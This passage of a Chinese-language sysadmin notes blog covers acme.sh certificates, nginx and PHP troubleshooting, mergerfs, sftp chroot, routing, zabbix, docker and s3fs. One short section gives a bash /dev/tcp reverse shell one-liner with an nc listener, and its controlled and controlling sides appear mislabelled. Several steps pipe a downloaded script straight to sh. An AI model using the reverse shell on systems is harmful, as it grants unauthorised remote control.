+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># cloudflare </span>
+</span></span><span class="line"><span class="cl">$&gt; curl  https://get.acme.sh <span class="p">|</span> sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$&gt; <span class="nb">export</span> <span class="nv">CF_Token</span><span class="o">=</span><span class="s2">&#34;xxxxx&#34;</span>
+</span></span><span class="line"><span class="cl">$&gt; <span class="nb">export</span> <span class="nv">CF_Account_ID</span><span class="o">=</span><span class="s2">&#34;xxxxxx&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$&gt; acme.sh --issue -d example.com -d <span class="s1">&#39;*.example.com&#39;</span> --dns dns_cf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>腾讯云：腾讯云实际上需要使用的是<code>dnspod</code> 的 <code>id</code> 和 <code>token</code>他们两个是共用的，可以直接用腾讯云帐号登录<code>dnspod</code>,进去后获取到<code>id</code> 和 <code>token</code> 就行了</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 腾讯云</span>
+</span></span><span class="line"><span class="cl">$&gt; curl  https://get.acme.sh <span class="p">|</span> sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$&gt; <span class="nb">export</span> <span class="nv">DP_Id</span><span class="o">=</span><span class="s2">&#34;xxxxx&#34;</span>
+</span></span><span class="line"><span class="cl">$&gt; <span class="nb">export</span> <span class="nv">DP_Key</span><span class="o">=</span><span class="s2">&#34;xxxxx&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$&gt; acme.sh --issue -d example.com -d <span class="s1">&#39;*.example.com&#39;</span> --dns dns_dp
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="禅道bug管理系统" class="headerLink">
+    <a href="#%e7%a6%85%e9%81%93bug%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f" class="header-mark"></a>禅道bug管理系统</h1><ol>
+<li>这个部署遇到的一个坑就是<code>php</code>打死获取不到<code>session</code>的位置<br>
+打开调试日志方式是将<code>my.cnf</code> 中<code>debug</code>设置为<code>true</code><br>
+实际错误体现是 <code>ERROR: 您访问的域名 xxx.xxx.xxx 没有对应的公司。</code><br>
+我的解决方案是 代码目录整体权限设置为<code>777</code>,然后删除掉<code>my.cnf</code>进行重装,重装后在目录权限调整为正常权限即可.</li>
+<li>安装完成后，首页出现无限循环重定向，手动将<code>my.php</code>中<code>PATH_INFO</code>修改为<code>GET</code>，或在<code>nginx</code>传入变量<code>PATH_INFO</code>值<code>$request_uri;</code></li>
+</ol>
+<h1 id="nginx-代理php产生的一些故障" class="headerLink">
+    <a href="#nginx-%e4%bb%a3%e7%90%86php%e4%ba%a7%e7%94%9f%e7%9a%84%e4%b8%80%e4%ba%9b%e6%95%85%e9%9a%9c" class="header-mark"></a>nginx 代理php产生的一些故障</h1><p>记录一个<code>nginx</code> 代理 <code>php</code> 产生的问题,问题已经解决了,但是似乎还是没有找到根本原因,<strong>若有了解的,请一定解惑一二</strong>, 以下记录下处理过程 .</p>
+<ul>
+<li>
+<p>问题产生过程:</p>
+<ul>
+<li>A服务器代码迁移到B机器上,代码是<code>rsync</code>直接同步的,然后B运行的时候就出问题了,根据调试发现,无论访问什么(html/js/css)都会跳转到首页,实际应该是都会经过<code>php</code>解析(我发誓A和B的环境配置是一模一样的!A可以正常运行.), <code>php</code>框架为<code>opencart</code> .</li>
+</ul>
+</li>
+<li>
+<p>浏览器访问表现以下错误:</p>
+<ul>
+<li><code>Resource interpreted as Stylesheet but transferred with MIME type text/html</code></li>
+<li><code>ERR_CONNECTION_REFUSED</code></li>
+</ul>
+</li>
+<li>
+<p>处理过程 :</p>
+<ul>
+<li>问题实际上是头一天发生的,经过多方调试发现,实际上通过域名访问任何资源均会跳转到首页,访问<code>php</code>资源则会出现无法加载<code>js/css</code>等静态资源全部都是<code>MIME</code>类型问题,<code>nginx</code>强行给<code>css/js</code>等资源设置一个<code>content-type</code>前端也无法识别正确,另外也测试过网上提供的多方解决方案,仍然无法得到解决 .</li>
+<li>第二天, 保持原有<code>nginx</code>配置 , 我给对应站点首页的<code>index.php</code>代码中加入了<code>echo 123; exit();</code>进行测试,访问发现可正常断开,此时在访问根下的静态<code>html</code>测试文件,发现可以正常访问了,此时删除<code>echo 123; exit();</code>,重新访问<code>index.php</code>,发现(js/css)静态资源被升级为<code>https</code>访问,此时我给相关域名配置上证书,然后访问就正常了!!!</li>
+</ul>
+</li>
+<li>
+<p>原因分析:</p>
+<ul>
+<li>站点缓存(这个可能性最大),<code>opencart</code>框架实际上<code>session</code>是存储到数据库中的,估计很多的<code>cache</code>也是存于数据中的,而今天解决的时间也恰好距离我最后一次同步一天的样子.</li>
+<li><code>nginx</code> 配置域名过多,导致配置混乱. B服务器的<code>nginx</code>实际上已经配置了很多个域名,<code>php</code>解析的<code>SCRIPT_FILENAME</code> 我使用的是<code>$document_root</code>,最后一次修改我也将<code>$document_root</code>修改为了具体的路径,不知道会不会是这个原因产生的.</li>
+</ul>
+</li>
+</ul>
+<h1 id="linux-合并文件系统-margerfs" class="headerLink">
+    <a href="#linux-%e5%90%88%e5%b9%b6%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f-margerfs" class="header-mark"></a>linux 合并文件系统 margerfs</h1><blockquote>
+<p><a href="https://wzyboy.im/post/1148.html" target="_blank" rel="noopener noreffer">https://wzyboy.im/post/1148.html</a></p>
+</blockquote>
+<blockquote>
+<p><a href="https://github.com/trapexit/mergerfs" target="_blank" rel="noopener noreffer">https://github.com/trapexit/mergerfs</a></p>
+</blockquote>
+<p>使用示例:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 挂载到的目录必须为空</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 命令挂载</span>
+</span></span><span class="line"><span class="cl">$&gt; mergerfs -o defaults,allow_other,use_ino,minfreespace<span class="o">=</span>10G,ignorepponrename<span class="o">=</span><span class="nb">true</span> /data01:/data02 /shares
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># fstab</span>
+</span></span><span class="line"><span class="cl">$&gt; /etc/fstab
+</span></span><span class="line"><span class="cl">/data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace<span class="o">=</span>10G,ignorepponrename<span class="o">=</span><span class="nb">true</span> <span class="m">0</span> <span class="m">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="linux-sftp-搭建" class="headerLink">
+    <a href="#linux-sftp-%e6%90%ad%e5%bb%ba" class="header-mark"></a>linux sftp 搭建</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 编辑文件 /etc/ssh/sshd_config,末尾添加(新建的用户若仅使用sftp可以不指定可登陆的bash)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 若想要让sftp更像登陆到了服务器,可配合chroot来控制,当然也可以直接创建账号，但一般不建议</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># </span>
+</span></span><span class="line"><span class="cl">Match Group  www                          <span class="c1"># 限制某个组或者某个用户使用以下规则</span>
+</span></span><span class="line"><span class="cl">    ChrootDirectory  /data/sftp    <span class="c1"># sftp 限制登陆目录到此处</span>
+</span></span><span class="line"><span class="cl">    ForceCommand internal-sftp            <span class="c1"># 仅允许使用sftp </span>
+</span></span><span class="line"><span class="cl">    X11Forwarding no                      <span class="c1"># 禁止x11转发</span>
+</span></span><span class="line"><span class="cl">    AllowTcpForwarding no                 <span class="c1"># 禁止 tcp 转发  </span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="监听本地网卡上没有的ip地址" class="headerLink">
+    <a href="#%e7%9b%91%e5%90%ac%e6%9c%ac%e5%9c%b0%e7%bd%91%e5%8d%a1%e4%b8%8a%e6%b2%a1%e6%9c%89%e7%9a%84ip%e5%9c%b0%e5%9d%80" class="header-mark"></a>监听本地网卡上没有的IP地址</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 一般用于 keepalive + nginx 使用</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;net.ipv4.ip_nonlocal_bind = 1&#39;</span> &gt;&gt; /etc/sysctl.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="腾讯云第二块网卡绑定公网ip" class="headerLink">
+    <a href="#%e8%85%be%e8%ae%af%e4%ba%91%e7%ac%ac%e4%ba%8c%e5%9d%97%e7%bd%91%e5%8d%a1%e7%bb%91%e5%ae%9a%e5%85%ac%e7%bd%91ip" class="header-mark"></a>腾讯云第二块网卡绑定公网ip</h1><p>官方文档是有记录的，这儿记录下服务器上的设置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 网卡初始化</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">DEVICE</span><span class="o">=</span>eth1
+</span></span><span class="line"><span class="cl"><span class="nv">NM_CONTROLLED</span><span class="o">=</span>yes
+</span></span><span class="line"><span class="cl"><span class="nv">ONBOOT</span><span class="o">=</span>yes
+</span></span><span class="line"><span class="cl"><span class="nv">IPADDR</span><span class="o">=</span>&lt;网卡2IP&gt;
+</span></span><span class="line"><span class="cl"><span class="nv">NETMASK</span><span class="o">=</span>255.255.240.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># </span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10 t1&#34;</span> &gt;&gt; /etc/iproute2/rt_tables
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;20 t2&#34;</span> &gt;&gt; /etc/iproute2/rt_tables
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/sbin/ip route add default dev eth0 via 172.21.0.1 table <span class="m">10</span>
+</span></span><span class="line"><span class="cl">/usr/sbin/ip route add default dev eth1 via 172.21.0.1 table <span class="m">20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/usr/sbin/ip rule add from 172.21.2.168 table <span class="m">10</span>
+</span></span><span class="line"><span class="cl">/usr/sbin/ip rule add from 172.21.2.74 table <span class="m">20</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="shell-反弹" class="headerLink">
+    <a href="#shell-%e5%8f%8d%e5%bc%b9" class="header-mark"></a>shell 反弹</h1><blockquote>
+<p><a href="https://blog.csdn.net/weixin_41082546/article/details/104123131" target="_blank" rel="noopener noreffer">https://blog.csdn.net/weixin_41082546/article/details/104123131</a></p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 被控端执行  </span>
+</span></span><span class="line"><span class="cl">nc -lvp <span class="m">65535</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 控制端执行 </span>
+</span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/&lt;被控端ip&gt;/65535 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="zabbix-自动发现异常错误" class="headerLink">
+    <a href="#zabbix-%e8%87%aa%e5%8a%a8%e5%8f%91%e7%8e%b0%e5%bc%82%e5%b8%b8%e9%94%99%e8%af%af" class="header-mark"></a>zabbix 自动发现异常错误</h1><ul>
+<li>具体错误表现</li>
+</ul>
+<ol>
+<li><code>Cannot create item: item with the same key &quot;domain.status[{#DOMAIN_NAME},http_code]&quot; already exists.</code></li>
+<li><code>Cannot accurately apply filter: no value received for macro &quot;{#DOMAINNAME}&quot;.</code></li>
+</ol>
+<ul>
+<li>解决方案
+<ul>
+<li>这个是特么的自动发现脚本返回值的<code>key</code>必须用<code>{}</code>括起来,不然你即使是<code>json</code>格式他也不会认, 网上那些这个抄那个的坑货就只知道变量要大写，还有个坑告诉我要使用宏,用了宏就是第二个问题,不用第一个，这我是记得很清楚，宏并不是必定要有的啊，我以前写也基本没有加过。 我特么也是蠢了，写了这么多的自动发现，居然没有注意要括起来。</li>
+</ul>
+</li>
+</ul>
+<h1 id="nginx-获取cdn真实用户ip" class="headerLink">
+    <a href="#nginx-%e8%8e%b7%e5%8f%96cdn%e7%9c%9f%e5%ae%9e%e7%94%a8%e6%88%b7ip" class="header-mark"></a>nginx 获取cdn真实用户ip</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># client_real_ip 即为用户真实IP,可直接用于替换 remote_addr 
+</span></span><span class="line"><span class="cl">  map $http_x_forwarded_for  $client_real_ip {
+</span></span><span class="line"><span class="cl">      &#34;&#34;  $remote_addr;
+</span></span><span class="line"><span class="cl">      ~^(?P&lt;firstAddr&gt;[0-9\.]+),?.*$  $firstAddr;
+</span></span><span class="line"><span class="cl">  }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="virtualbox---从主机端口80到virtualbox端口80的端口转发不起作用" class="headerLink">
+    <a href="#virtualbox---%e4%bb%8e%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a380%e5%88%b0virtualbox%e7%ab%af%e5%8f%a380%e7%9a%84%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91%e4%b8%8d%e8%b5%b7%e4%bd%9c%e7%94%a8" class="header-mark"></a>virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用</h1><p>此次问题实际出现是在<code>windows</code>上, 理论上说<code>linux</code>下若使用<code>nat</code>功能可能也会出现该问题(至于为什么用<code>nat</code>,<code>virtualbox</code>似乎并不支持桥接网卡,因此要为虚拟机分配物理<code>ip</code>似乎就只能在物理机绑定多个<code>ip</code>,然后<code>nat</code>转发到虚拟机中), <code>virtualbox</code>在转发<code>80</code>端口时似乎会与物理机的<code>80</code>冲突,从而导致转发无效,这个可能是因为我物理机也启用了<code>IIS</code>的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案.</p>
+<ul>
+<li>解决方案</li>
+</ul>
+<ol>
+<li>我是用的 <code>windows</code>的端口转发解决的, <code>virtualbox</code>在<code>nat</code>的时候转发一个其他端口(比如<code>8080</code>)到内部的<code>80</code>, 然后在<code>windows</code> 在进行一次转发,将绑定的<code>ip</code>的<code>80</code>端口转发到<code>8080</code>上,这样也可以解决,骚操作看 <a href="/2022/%e5%91%bd%e4%bb%a4%e6%94%b6%e9%9b%86/#3-windows-%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" rel=""><code>windows命令收集</code>-<code>端口转发</code></a></li>
+<li>还有个说的是用管理员身份运行<code>virtualbox</code>,也可以解决,不过我没有验证过</li>
+</ol>
+<blockquote>
+<p><a href="https://www.coder.work/article/6503907" target="_blank" rel="noopener noreffer">https://www.coder.work/article/6503907</a></p>
+</blockquote>
+<h1 id="docker-网络桥联网络无法访问物理机网络问题" class="headerLink">
+    <a href="#docker-%e7%bd%91%e7%bb%9c%e6%a1%a5%e8%81%94%e7%bd%91%e7%bb%9c%e6%97%a0%e6%b3%95%e8%ae%bf%e9%97%ae%e7%89%a9%e7%90%86%e6%9c%ba%e7%bd%91%e7%bb%9c%e9%97%ae%e9%a2%98" class="header-mark"></a>docker 网络桥联网络无法访问物理机网络问题</h1><ul>
+<li>当容器以桥连模式启动时是无法访问物理主机网络的,此时需要手动配置下防火墙信任容器的桥连网卡流量</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> <span class="c1"># 如容器启动后的网卡为 br-3630aa8a433b ,则防火墙添加下 </span>
+</span></span><span class="line"><span class="cl"> $&gt; iptables -A INPUT -i br-3630aa8a433b -j ACCEPT
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="服务器默认端口优化" class="headerLink">
+    <a href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bc%98%e5%8c%96" class="header-mark"></a>服务器默认端口优化</h1><ol>
+<li>检查所有非22开启的端口：<code>netstat -lntp</code></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; netstat -lntp
+</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:25            0.0.0.0:*               LISTEN      1317/master         
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:111             0.0.0.0:*               LISTEN      1/systemd           
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      1569/sshd           
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> ::1:25                  :::*                    LISTEN      1317/master         
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::111                  :::*                    LISTEN      1/systemd           
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      1569/sshd 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>查询<code>/etc/services</code>下端口对应的服务：<code>grep -E &quot;25|111/&quot; /etc/services </code></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; grep -E <span class="s2">&#34;\ 25/|\ 111/&#34;</span> /etc/services 
+</span></span><span class="line"><span class="cl">smtp            25/tcp          mail
+</span></span><span class="line"><span class="cl">smtp            25/udp          mail
+</span></span><span class="line"><span class="cl">sunrpc          111/tcp         portmapper rpcbind      <span class="c1"># RPC 4.0 portmapper TCP</span>
+</span></span><span class="line"><span class="cl">sunrpc          111/udp         portmapper rpcbind      <span class="c1"># RPC 4.0 portmapper UD</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li>检查服务的运行状态(第三列为服务名称)： <code>systemctl list-unit-files |grep -E &quot;rpcbind|portmapper|mail&quot;</code>, 若单个端口所映射的服务没有查询到，需要通过运行端口的<code>pid</code>去查询他具体是属于那个程序的，然后然后去查询具体的服务启动状态。</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; systemctl list-unit-files <span class="p">|</span>grep -E <span class="s2">&#34;rpcbind|portmapper|postfix&#34;</span>
+</span></span><span class="line"><span class="cl">postfix.service                               enabled 
+</span></span><span class="line"><span class="cl">rpcbind.service                               enabled 
+</span></span><span class="line"><span class="cl">rpcbind.socket                                enabled 
+</span></span><span class="line"><span class="cl">rpcbind.target                                static  
+</span></span><span class="line"><span class="cl">$&gt; systemctl stop postfix.service rpcbind.service rpcbind.socket     <span class="c1"># 关闭启动的服务</span>
+</span></span><span class="line"><span class="cl">$&gt; systemctl disable postfix.service rpcbind.service rpcbind.socket     <span class="c1"># 禁用开机启动</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="linux-下hosts文件和dns服务器的响应顺序" class="headerLink">
+    <a href="#linux-%e4%b8%8bhosts%e6%96%87%e4%bb%b6%e5%92%8cdns%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%9a%84%e5%93%8d%e5%ba%94%e9%a1%ba%e5%ba%8f" class="header-mark"></a>linux 下hosts文件和dns服务器的响应顺序</h1><ul>
+<li>通过修改 <code>/etc/nsswitch.conf</code> 进行更换 , 更换<code>/etc/nsswitch.conf: 86</code>中的<code>files</code>和<code>dns</code>的顺序即可</li>
+</ul>
+<h1 id="git-提交类型" class="headerLink">
+    <a href="#git-%e6%8f%90%e4%ba%a4%e7%b1%bb%e5%9e%8b" class="header-mark"></a>git 提交类型</h1><table>
+<thead>
+<tr>
+<th style="text-align:left">类型</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>feat</code></td>
+<td style="text-align:left">新增 <code>feature</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>fix</code></td>
+<td style="text-align:left">修复 <code>bug</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>docs</code></td>
+<td style="text-align:left">仅仅修改了文档，比如<code>README</code>, <code>CHANGELOG</code>, <code>CONTRIBUTE</code>等等</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>style</code></td>
+<td style="text-align:left">仅仅修改了空格、格式缩进、都好等等，不改变代码逻辑</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>refactor</code></td>
+<td style="text-align:left">代码重构，没有加新功能或者修复<code>bug</code></td>
+</tr>
+<tr>
+<td style="text-align:left"><code>perf</code></td>
+<td style="text-align:left">优化相关，比如提升性能、体验</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>test</code></td>
+<td style="text-align:left">测试用例，包括单元测试、集成测试等</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>chore</code></td>
+<td style="text-align:left">改变构建流程、或者增加依赖库、工具等</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>revert</code></td>
+<td style="text-align:left">回滚到上一个版本</td>
+</tr>
+</tbody>
+</table>
+<h1 id="nginx-伪静态无效问题" class="headerLink">
+    <a href="#nginx-%e4%bc%aa%e9%9d%99%e6%80%81%e6%97%a0%e6%95%88%e9%97%ae%e9%a2%98" class="header-mark"></a>nginx 伪静态无效问题</h1><ul>
+<li>具体错误体现
+拿到<code>apache</code>的<code>.htaccess</code>文件后，通过<a href="https://www.winginx.com/en/htaccess" target="_blank" rel="noopener noreffer"><code>https://www.winginx.com/en/htaccess</code></a>转换为了<code>nginx</code>可用的规则，但加入后访问跳转一直是<code>404</code>,经检查<code>location</code>是定位成功了的，但就是访问不了</li>
+<li>解决方案:</li>
+</ul>
+<ol>
+<li>后续开发提供了另一个伪静态配置,所有<code>rewrite</code>是放在<code>if</code>指令中(<code>!-e $request_filename</code>)，然后就可以了。我对比了下，两者的差异就是，一个是放在了<code>location</code>中，定位了每一个<code>rewrite</code>所在的位置。还有就是放在<code>if</code>中的<code>rewrite</code>的匹配规则是用引号括起来了的。具体原因暂时还是每搞清楚。后续出现需测试下引号是否有影响.</li>
+</ol>
+<h1 id="linux-通过s3fs挂载七牛云存储" class="headerLink">
+    <a href="#linux-%e9%80%9a%e8%bf%87s3fs%e6%8c%82%e8%bd%bd%e4%b8%83%e7%89%9b%e4%ba%91%e5%ad%98%e5%82%a8" class="header-mark"></a>linux 通过s3fs挂载七牛云存储</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$&gt; sudo yum install epel-release
+</span></span><span class="line"><span class="cl">$&gt; sudo yum install s3fs-fuse
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$&gt; <span class="nb">echo</span> AK:SK &gt; /mnt/.passwd-s3fs
+</span></span><span class="line"><span class="cl">$&gt; chmod <span class="m">600</span> /mnt/.passwd-s3fs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$&gt; s3fs s3空间名 /mnt/s3fs -o <span class="nv">passwd_file</span><span class="o">=</span>/mnt/.passwd-s3fs -o <span class="nv">url</span><span class="o">=</span>http://s3-cn-north-1.qiniucs.com -o use_path_request_style   <span class="c1"># -o dbglevel=info -f -o curldbg # 日志信息</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="普通用户校验是否有权限通过dockersock操作-docker" class="headerLink">
+    <a href="#%e6%99%ae%e9%80%9a%e7%94%a8%e6%88%b7%e6%a0%a1%e9%aa%8c%e6%98%af%e5%90%a6%e6%9c%89%e6%9d%83%e9%99%90%e9%80%9a%e8%bf%87dockersock%e6%93%8d%e4%bd%9c-docker" class="header-mark"></a>普通用户校验是否有权限通过docker.sock操作 docker</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo -u zabbix curl --unix-socket /var/run/docker.sock --no-buffer -XGET v1.24/_ping
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="rdesktop-vrdp-远程桌面工具安装" class="headerLink">
+    <a href="#rdesktop-vrdp-%e8%bf%9c%e7%a8%8b%e6%a1%8c%e9%9d%a2%e5%b7%a5%e5%85%b7%e5%ae%89%e8%a3%85" class="header-mark"></a>rdesktop-vrdp 远程桌面工具安装</h1><ul>
+<li>rdesktop-vrdp 是 viralbox的一个很好用的远程桌面工具，没有独立包，可从virtualbox下分离出来单独使用</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$&gt; sudo dnf install liblzf
+</span></span><span class="line"><span class="cl">$&gt; rpm2cpio VirtualBox-server-6.1.28-1.fc33.x86_64.rpm |cpio -div
